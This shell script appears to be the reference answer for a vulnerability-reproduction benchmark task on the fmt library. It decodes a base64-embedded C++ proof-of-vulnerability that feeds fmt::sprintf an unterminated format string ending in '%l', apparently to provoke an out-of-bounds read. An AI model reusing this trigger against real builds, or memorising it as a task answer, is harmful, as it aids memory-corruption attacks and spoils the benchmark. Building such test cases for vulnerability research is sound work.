#!/bin/bash
# Reference solution (oracle): materialize the CyberForge ground-truth PoV for
# fmt / vulnerability_WF_LLM_4 (dataset file: newplatform_bundles/conversion/replay_deep/fmt/vulnerability_WF_LLM_4 (program)) at /workspace/poc.
# It does not build anything: grading runs on the task-server's own builds.
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
I2luY2x1ZGUgPGZtdC9wcmludGYuaD4KI2luY2x1ZGUgPGNzdHJpbmc+CiNpbmNsdWRlIDxjc3Rk
bGliPgojaW5jbHVkZSA8c3RyaW5nPgojaW5jbHVkZSA8Y3N0ZGlvPgojaW5jbHVkZSA8ZXhjZXB0
aW9uPgppbnQgbWFpbigpIHsKICBjb25zdCBzaXplX3QgTiA9IDY0OwogIGNoYXIqIGZidWYgPSBz
dGF0aWNfY2FzdDxjaGFyKj4obWFsbG9jKE4pKTsKICBtZW1zZXQoZmJ1ZiwgJ3gnLCBOKTsKICBm
YnVmW04gLSAyXSA9ICclJzsKICBmYnVmW04gLSAxXSA9ICdsJzsKICB0cnkgewogICAgc3RkOjpz
dHJpbmcgcyA9IGZtdDo6c3ByaW50ZihmbXQ6OnN0cmluZ192aWV3KGZidWYsIE4pLCA0Mik7CiAg
ICBmcHJpbnRmKHN0ZGVyciwgImZvcm1hdHRlZCAlenUgYnl0ZXNcbiIsIHMuc2l6ZSgpKTsKICB9
IGNhdGNoIChjb25zdCBzdGQ6OmV4Y2VwdGlvbiYpIHsgZnJlZShmYnVmKTsgcmV0dXJuIDA7IH0K
ICBmcmVlKGZidWYpOwogIHJldHVybiAwOwp9Cg==
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
